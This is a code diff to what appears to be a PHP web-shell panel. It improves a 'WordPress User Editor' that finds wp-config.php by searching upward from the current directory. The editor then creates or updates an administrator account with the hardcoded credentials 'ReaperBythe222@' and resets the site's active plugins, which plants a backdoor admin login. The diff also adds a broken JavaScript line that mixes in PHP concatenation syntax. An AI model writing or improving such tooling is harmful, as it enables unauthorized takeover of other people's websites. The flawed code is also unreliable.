@@ -200,22 +200,45 @@ function RBPdownloadDomainsList($baseDir, $filename) {
     return $domainsList;
 }
 
-// WordPress User Editor Function - RUNS FROM CURRENT DIRECTORY
+// WordPress User Editor Function - FIXED TO FIND WP-CONFIG.PHP
 function RBPeditWordPressUser() {
     $result = [];
     
-    // Use current directory - assuming we're in WordPress root
-    $wpConfigPath = getcwd() . '/wp-config.php';
-    $wpDir = getcwd();
+    // Start from current directory and search upwards for wp-config.php
+    $currentDir = getcwd();
+    $wpConfigPath = null;
+    $wpDir = null;
     
-    if (!file_exists($wpConfigPath)) {
-        $result['error'] = "❌ WordPress configuration file (wp-config.php) not found in current directory!";
-        $result['current_dir'] = $wpDir;
+    // Search for wp-config.php in current directory and parent directories
+    $searchDir = $currentDir;
+    $maxDepth = 10; // Prevent infinite loop
+    
+    for ($i = 0; $i < $maxDepth; $i++) {
+        $configPath = $searchDir . '/wp-config.php';
+        if (file_exists($configPath)) {
+            $wpConfigPath = $configPath;
+            $wpDir = $searchDir;
+            break;
+        }
+        
+        // If we're at root, stop searching
+        if ($searchDir === '/' || $searchDir === dirname($searchDir)) {
+            break;
+        }
+        
+        $searchDir = dirname($searchDir);
+    }
+    
+    if (!$wpConfigPath || !file_exists($wpConfigPath)) {
+        $result['error'] = "❌ WordPress configuration file (wp-config.php) not found! Searched from: $currentDir";
+        $result['current_dir'] = $currentDir;
+        $result['searched_paths'] = "Searched up to: $searchDir";
         return $result;
     }
     
     $result['wp_config_path'] = $wpConfigPath;
-    
+    $result['wp_directory'] = $wpDir;
+
     // Default credentials
     $new_user_login = 'ReaperBythe222@';
     $new_user_pass  = 'ReaperBythe222@';
@@ -486,7 +509,8 @@ require __DIR__ . '/wp-blog-header.php';";
     $result['success'] = "✅ WordPress user " . $result['action'] . " successfully!";
     $result['credentials'] = "Username: $new_user_login | Password: $new_user_pass";
     $result['login_url'] = $loginUrl;
-    $result['current_dir'] = $wpDir;
+    $result['current_dir'] = $currentDir;
+    $result['wp_directory_found'] = $wpDir;
     
     return $result;
 }
@@ -1201,7 +1225,7 @@ if (isset($_SESSION['adminer_result'])) {
             domains.forEach(function(domain) {
                 var div = document.createElement('div');
                 div.className = 'domain-item';
-                div.textContent = domain.name + ' -> ' + domain.path;
+                div.textContent = domain.name + ' -> ' . domain.path;
                 domainInfo.appendChild(div);
             });
             
@@ -1407,6 +1431,9 @@ if (isset($_SESSION['adminer_result'])) {
                     if (isset($result['current_dir'])) {
                         echo '<p style="color: #ccc; font-size: 12px; margin-top: 10px;">Current directory: ' . htmlspecialchars($result['current_dir']) . '</p>';
                     }
+                    if (isset($result['searched_paths'])) {
+                        echo '<p style="color: #ccc; font-size: 12px; margin-top: 5px;">' . htmlspecialchars($result['searched_paths']) . '</p>';
+                    }
                     echo '</div>';
                 } elseif (isset($result['success'])) {
                     echo '<div class="success-box">';
@@ -1425,6 +1452,12 @@ if (isset($_SESSION['adminer_result'])) {
                     if (isset($result['wp_config_path'])) {
                         echo '<p style="color: #ccc; font-size: 12px; margin-top: 15px;">';
                         echo 'Using wp-config.php at: ' . htmlspecialchars($result['wp_config_path']);
+                        echo '</p>';
+                    }
+                    
+                    if (isset($result['wp_directory_found'])) {
+                        echo '<p style="color: #ccc; font-size: 12px; margin-top: 10px;">';
+                        echo 'WordPress directory found: ' . htmlspecialchars($result['wp_directory_found']);
                         echo '</p>';
                     }
                     
@@ -1544,7 +1577,7 @@ if (isset($_SESSION['adminer_result'])) {
                 <h3>WordPress User Editor</h3>
                 <p>This will automatically:</p>
                 <ul style="text-align: left; margin: 15px 0; padding-left: 20px;">
-                    <li>Use current directory as WordPress root</li>
+                    <li>Search for wp-config.php in current and parent directories</li>
                     <li>Create/update admin user</li>
                     <li>Set default credentials</li>
                     <li>Reset active plugins</li>
@@ -1560,7 +1593,7 @@ if (isset($_SESSION['adminer_result'])) {
                     <button onclick="RBPsubmitWPEditUser()" class="tool-button" style="background: #4CAF50; border-color: #4CAF50;">Edit WordPress User</button>
                     <button onclick="RBPclosePopup('wpedituserPopup')" class="tool-button">Cancel</button>
                 </div>
-                <p><small>Note: Make sure wp-config.php exists in current directory</small></p>
+                <p><small>Note: Will search for wp-config.php automatically from current directory</small></p>
             </div>
         </div>
     </div>
